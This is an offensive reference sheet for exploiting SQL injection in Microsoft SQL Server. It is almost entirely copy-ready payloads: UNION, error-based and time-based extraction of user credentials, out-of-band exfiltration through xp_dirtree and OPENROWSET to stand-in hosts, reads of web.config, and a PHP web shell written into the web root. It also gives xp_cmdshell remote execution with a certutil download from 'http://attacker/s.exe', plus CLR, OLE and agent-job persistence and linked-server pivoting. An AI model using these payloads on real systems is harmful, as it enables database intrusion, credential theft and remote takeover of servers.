# MSSQL / SQL Server — full exploitation reference

MSSQL is the OOB + RCE king: `xp_*` extended procs give UNC lookups,
file ops, and command exec that most other engines need contortions
for. Quotes in MSSQL are `"` (identifier) and `'` (string) —
injection still almost always lives in `'`.

---

## 1. Fingerprint

```sql
@@version                          -- 'Microsoft SQL Server 2019 (RTM)...'
@@servername                       -- machine name
SERVERPROPERTY('productversion')   -- '15.0.2000.5'
SERVERPROPERTY('edition')
SYSTEM_USER, SUSER_SNAME(), USER_NAME()
DB_NAME(), ORIGINAL_DB_NAME()
@@SPID, @@SERVICENAME
HOST_NAME()
```

Only-on-MSSQL tells: `WAITFOR DELAY`, `xp_cmdshell`, `@@version`
returns the Microsoft banner (MySQL also has @@version but the
value distinguishes), `TOP`, `+` for concat, `sys.*` catalog views,
`sp_*` procs, `[dbo]`, `master..` two-dot notation.

---

## 2. Catalog map

```sql
-- databases
SELECT name FROM master..sysdatabases;          -- classic
SELECT name FROM sys.databases;                 -- modern
SELECT name FROM master.sysdatabases;

-- tables (current db)
SELECT name FROM sysobjects WHERE xtype='U';
SELECT name FROM sys.tables;
SELECT table_name FROM information_schema.tables
  WHERE table_type='BASE TABLE';
-- tables in another db
SELECT name FROM otherdb..sysobjects WHERE xtype='U';
SELECT name FROM otherdb.sys.tables;

-- columns
SELECT name FROM syscolumns WHERE id=
  (SELECT id FROM sysobjects WHERE name='users');
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users');
SELECT column_name FROM information_schema.columns
  WHERE table_name='users';

-- logins/users
SELECT name,password_hash FROM sys.sql_logins;
SELECT name,type_desc,is_disabled FROM sys.server_principals;
SELECT USER_NAME(sid) FROM sys.database_principals;
SELECT name FROM sysusers;

-- linked servers (pivot surface!)
SELECT name,product,provider,data_source FROM sys.linked_servers;
SELECT srvname,srvproduct FROM master..sysservers;

-- jobs (scheduled code — read for lateral moves)
SELECT j.name,s.step_name,s.command FROM msdb.dbo.sysjobs j
  JOIN msdb.dbo.sysjobsteps s ON j.job_id=s.job_id;

-- triggers/procs (logic + creds hide here)
SELECT name FROM sysobjects WHERE xtype IN ('P','TR','FN');
SELECT OBJECT_NAME(m.object_id),m.definition FROM sys.sql_modules m;
```

---

## 3. UNION extraction recipes

```sql
' UNION SELECT NULL,'~'+@@version+'~',NULL-- -
' UNION SELECT NULL,'~'+SYSTEM_USER+'~',NULL-- -
' UNION SELECT NULL,'~'+DB_NAME()+'~',NULL-- -

' UNION SELECT NULL,name,NULL FROM master..sysdatabases-- -
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns
   WHERE table_name='users'-- -
' UNION SELECT NULL,username+':'+password,NULL FROM users-- -

-- aggregate dump (no group_concat — use FOR XML PATH)
' UNION SELECT NULL,(SELECT name+',' FROM sys.tables
   FOR XML PATH('')),NULL-- -
' UNION SELECT NULL,(SELECT name+';' FROM master..sysdatabases
   FOR XML PATH('')),NULL-- -
' UNION SELECT NULL,(SELECT username+':'+password+';' FROM users
   FOR XML PATH('')),NULL-- -
```

`FOR XML PATH('')` escapes `<>&` as `&lt;&gt;&amp;` — fine for
collection; use `FOR XML PATH(''),TYPE.value('.','varchar(max)')`
to un-escape, or `STUFF(...FOR XML PATH)` pattern for clean lists:

```sql
STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')
```

Casts: `+` concat needs compatible types —
`'~'+CAST(cnt AS varchar)` or `CONVERT(varchar,x)`.
`CONCAT()` exists since 2012 and tolerates NULLs.

---

## 4. Error-based recipes

```sql
' AND 1=CONVERT(int,@@version)-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM
   information_schema.columns WHERE table_name='users'))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password
   FROM users))-- -
' AND 1 IN (SELECT CAST(@@version AS int))-- -
' AND (SELECT CAST(DB_NAME() AS int))=1-- -
```

Echo: `Conversion failed when converting the nvarchar value
'Microsoft SQL Server...' to data type int.`

---

## 5. Blind recipes

```sql
-- boolean
' AND LEN(DB_NAME())>5-- -
' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100-- -
' AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>77-- -
' AND (SELECT COUNT(*) FROM sys.tables)>10-- -

-- time (WAITFOR is a statement — use IF)
'; IF LEN(DB_NAME())>5 WAITFOR DELAY '0:0:3'-- -
'; IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>77
   WAITFOR DELAY '0:0:3'-- -
'; IF (SELECT COUNT(*) FROM sys.tables)>10
   WAITFOR DELAY '0:0:4'-- -
' WAITFOR DELAY '0:0:5'-- -                 -- in-string works too

-- conditional error
' AND 1=(CASE WHEN LEN(db_name())>5 THEN 1 ELSE 1/0 END)-- -
```

---

## 6. Stacked queries — MSSQL's default strength

Most MSSQL drivers (ADO.NET, pyodbc, FreeTDS, JDBC jTDS) allow `;`
stacked statements natively:

```sql
'; EXEC xp_cmdshell 'whoami'-- -
'; INSERT INTO logs VALUES('x')-- -
'; BACKUP DATABASE x TO DISK='c:\x.bak'-- -
'; SHUTDOWN-- -                             -- destructive; lab only
```

The second result set normally never reaches the page — use stacked
for writes/exec, UNION/blind for extraction.

---

## 7. OOB — the signature MSSQL move

`xp_dirtree`/`xp_subdirs`/`xp_fileexist` resolve UNC paths:
`\\attacker\share` → DNS lookup + SMB attempt. Listener log = proof.

```sql
'; EXEC master..xp_dirtree '\\uniq.oob\a'-- -
'; EXEC master.dbo.xp_subdirs '\\uniq.oob\a'-- -
'; EXEC master..xp_fileexist '\\uniq.oob\a'-- -
'; EXEC master..xp_getfiledetails '\\uniq.oob\a'-- -

-- with extracted data as the host label
'; DECLARE @x varchar(200);
   SET @x='\\'+CAST(@@version AS varchar)+'.oob\a';
   EXEC master..xp_dirtree @x-- -
'; DECLARE @x varchar(200);
   SELECT @x=CAST(name AS varchar) FROM sys.tables WHERE name LIKE '%';
   EXEC master..xp_dirtree ('\\'+@x+'.oob\a')-- -

-- multi-row label pump: one proc call per row via cursor-free trick
'; DECLARE @x varchar(64); SELECT TOP 1 @x=name FROM sys.tables
   ORDER BY name; EXEC master..xp_dirtree '\\'+@x+'.oob\a'-- -
```

Non-stacked forms (when `;` blocked):

```sql
' AND (SELECT 1 FROM master.dbo.sysobjects WHERE
   master.dbo.xp_fileexist('\\x.oob\a')=1)-- -   -- hmm, xp_* return
   -- tables not scalars — use UNION SELECT wrapper instead:
' UNION SELECT * FROM master.dbo.xp_dirtree('\\x.oob\a')-- -
' UNION SELECT NULL,master.dbo.fn_varbintohexstr(
   CAST('x' AS varbinary)),NULL-- -
```

OPENROWSET to a fake server = both lookup AND credential sniff
(impacket-smbserver catches the auth attempt):

```sql
'; SELECT * FROM OPENROWSET('SQLOLEDB','uid=x;pwd=y;
   Network=DBMSSOCN;Address=x.oob,80','select 1')-- -
'; SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
   '\\x.oob\a.accdb','select 1 from x')-- -
```

See `oob.md` for listener setup.

---

## 8. File read/write

```sql
-- read any file via OPENROWSET BULK (needs ADMINISTER BULK
-- OPERATIONS or sysadmin; works on Azure SQL too)
' UNION SELECT NULL,(SELECT BulkColumn FROM OPENROWSET(
   BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) x),NULL-- -
' UNION SELECT NULL,(SELECT CONVERT(nvarchar(max),BulkColumn)
   FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_CLOB)x),NULL-- -

-- two-step via BULK INSERT (stacked):
'; CREATE TABLE t(x nvarchar(max));
   BULK INSERT t FROM 'C:\inetpub\wwwroot\web.config'-- -
' UNION SELECT NULL,x,NULL FROM t-- -

-- temp dir listing
'; EXEC xp_dirtree 'C:\inetpub\wwwroot\'-- -        -- returns rows —
-- xp_dirtree output IS readable via INSERT INTO t EXEC ...:
'; CREATE TABLE d(x nvarchar(400),y int,z int);
   INSERT d EXEC master..xp_dirtree 'c:\inetpub\wwwroot\';
   SELECT * FROM d-- -

-- write a file (bcp via xp_cmdshell or OPENROWSET export):
'; EXEC xp_cmdshell 'echo ^<?php system($_GET[c]);?^>
   > C:\inetpub\wwwroot\s.php'-- -
```

---

## 9. RCE paths (ordered)

1. **xp_cmdshell** — the classic. Needs sysadmin or explicit grant:

   ```sql
   -- if disabled, re-enable (needs sysadmin):
   '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
      EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
   '; EXEC xp_cmdshell 'whoami > C:\inetpub\wwwroot\w.txt'-- -
   '; EXEC master..xp_cmdshell 'powershell -e <b64>'-- -
   '; EXEC xp_cmdshell 'certutil -urlcache -split -f
      http://attacker/s.exe c:\windows\temp\s.exe'-- -
   ```

2. **sp_OACreate / sp_OAMethod** — OLE automation (needs
   `Ole Automation Procedures`):

   ```sql
   '; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE-- -
   '; DECLARE @o int; EXEC sp_OACreate 'WScript.Shell',@o OUT;
      EXEC sp_OAMethod @o,'Run',NULL,'cmd /c whoami > c:\w.txt'-- -
   '; DECLARE @x int; EXEC sp_OACreate 'MSXML2.XMLHTTP',@x OUT;
      EXEC sp_OAMethod @x,'open',NULL,'GET','http://oob/c',0;
      EXEC sp_OAMethod @x,'send'-- -                    -- OOB HTTP
   '; DECLARE @f int; EXEC sp_OACreate
      'Scripting.FileSystemObject',@f OUT; ...          -- file write
   ```

3. **CLR assembly** — `sp_configure 'clr enabled',1` + signed
   assembly upload:

   ```sql
   '; EXEC sp_configure 'clr enabled',1; RECONFIGURE-- -
   '; CREATE ASSEMBLY evil FROM 0x4D5A... WITH PERMISSION_SET=UNSAFE;
      CREATE PROCEDURE pwn AS EXTERNAL NAME evil.evil.run;
      EXEC pwn-- -
   ```

   `clr strict security` (2017+) makes unsigned CLR harder —
   `sp_configure 'clr strict security',0` first, or signed asm.

4. **Agent jobs** — `msdb.dbo.sp_add_job` + `sp_add_jobstep` with
   `cmdexec` subsystem + `sp_start_job` — persistent and harder to
   log; needs sysadmin or SQLAgentOperatorRole.

5. **Linked-server credential reuse** — `EXEC('...') AT linked`
   runs SQL on a linked server as ITS stored creds:

   ```sql
   '; EXEC('select @@version') AT [TARGETLINK]-- -
   '; SELECT * FROM OPENQUERY(TARGETLINK,'select name from
      sys.tables')-- -
   ```

6. **trusted constraint / trustworthy db** — `ALTER DATABASE x SET
   TRUSTWORTHY ON` escalates db_owner→sysadmin inside that db.

---

## 10. Privilege checks

```sql
' UNION SELECT NULL,IS_SRVROLEMEMBER('sysadmin'),NULL-- -  -- 1=yes
' UNION SELECT NULL,IS_SRVROLEMEMBER('sysadmin',
   'appuser'),NULL-- -
' UNION SELECT NULL,IS_MEMBER('db_owner'),NULL-- -
' UNION SELECT NULL,HAS_PERMS_BY_NAME(db_name(),'DATABASE',
   'BULK ADMIN'),NULL-- -          -- can I BULK INSERT?
' UNION SELECT NULL,SERVERPROPERTY('IsIntegratedSecurityOnly'),NULL-- -
' UNION SELECT NULL,USER_NAME(),NULL-- -          -- db user
' UNION SELECT NULL,SYSTEM_USER,NULL-- -          -- login
' UNION SELECT NULL,ORIGINAL_LOGIN(),NULL-- -     -- real caller
```

Impersonation:

```sql
'; EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER-- -     -- needs priv
'; EXECUTE AS USER='dbo'; SELECT USER_NAME()-- -
```

---

## 11. Quirks worth knowing

- `+` concat; `CONCAT()` exists 2012+.
- `TOP n` instead of LIMIT; `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY`
  for paging on 2012+.
- `--` comment needs the trailing space too; `/*...*/` fine.
- `CHAR(39)`/`CHAR(32)`/`0x...` builds strings quote-free.
- `EXEC(@sql)` + `sp_executesql` run dynamic SQL — stack tricks.
- `WAITFOR DELAY` is the only sleep; `WAITFOR TIME` schedules.
- `fn_varbintohexstr`/`sys.fn_sqlvarbasetostr` hex-ify binary data.
- `FOR XML PATH` is the group_concat; `STRING_AGG` exists on 2017+.
- `IIF(cond,a,b)` and `CASE` both work.
- `DB_NAME(N)` names db by id — enumeration shortcut.
- `IDENT_CURRENT`/`SCOPE_IDENTITY` leak row ids.
- Errors echo the failing VALUE inside CONVERT/CAST — that's the
  whole error channel.
- `tempdb` is writable by any user — `CREATE TABLE #t` works in
  stacked contexts for staging.

---

## 12. Second-order / persistence surface

- Agent jobs (`msdb`) — read for scheduled commands creds.
- `sys.server_triggers`, `sys.triggers` — logon/DDL triggers that
  hide persistence.
- `master` writes = global; `tempdb` resets on restart.
- `xp_regread`/`xp_regwrite` — registry read/write:

  ```sql
  '; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
     'SYSTEM\CurrentControlSet\Services\...','Value'-- -
  ```

---

## 13. Quick diagnosis table

| Need | Statement |
|---|---|
| who am I | `SYSTEM_USER`, `SUSER_SNAME()`, `ORIGINAL_LOGIN()` |
| where am I | `DB_NAME()`, `@@SERVERNAME`, `HOST_NAME()` |
| sysadmin? | `IS_SRVROLEMEMBER('sysadmin')` |
| list dbs | `master..sysdatabases` / `sys.databases` |
| list tables | `sysobjects WHERE xtype='U'` / `sys.tables` |
| list columns | `sys.columns` / `information_schema.columns` |
| read file | `OPENROWSET(BULK 'path',SINGLE_CLOB)` |
| dir list | `xp_dirtree 'dir'` (+`INSERT..EXEC`) |
| write file | `xp_cmdshell 'echo..'` / `bcp` |
| OOB | `xp_dirtree '\\u.oob\a'` — gold standard |
| RCE | `xp_cmdshell` (enable via `sp_configure`) |
| sleep | `WAITFOR DELAY '0:0:n'` |
| error echo | `CONVERT(int,x)`/`CAST(x AS int)` |
| dump rows | `FOR XML PATH('')` / `STRING_AGG` (2017+) |
| pivot | `OPENQUERY(linked,...)` / `EXEC AT` |
